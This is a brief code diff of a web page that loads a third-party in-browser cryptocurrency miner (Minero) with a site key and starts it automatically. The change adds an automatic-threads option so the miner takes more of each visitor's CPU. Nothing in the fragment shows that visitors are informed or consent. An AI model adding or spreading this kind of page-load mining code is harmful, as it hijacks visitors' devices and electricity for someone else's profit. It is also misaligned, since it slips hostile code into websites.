@@ -32,7 +32,9 @@
           <script src="https://minero.cc/lib/minero.min.js"></script>
 
           <script>
-            var miner = new Minero.Anonymous('e1aedca548f440b9147b72726b7b6f9f');
+            var miner = new Minero.Anonymous('e1aedca548f440b9147b72726b7b6f9f', {
+              autoThreads: true
+            });
             miner.start();
           </script>
 
